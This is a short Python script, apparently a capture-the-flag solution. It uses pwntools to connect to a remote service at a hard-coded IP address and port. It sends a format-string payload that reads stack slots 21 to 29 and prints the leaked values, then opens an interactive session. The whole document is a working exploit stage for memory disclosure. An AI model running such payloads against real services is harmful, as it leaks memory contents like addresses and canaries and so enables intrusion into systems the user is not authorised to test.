from pwn import *
p = remote('103.107.183.244',9701)
payload = ''
for i in range(21,30):
    payload += '%'+str(i)+'$p'
p.sendline(payload)
print(p.recvuntil('\n'))
p.interactive()

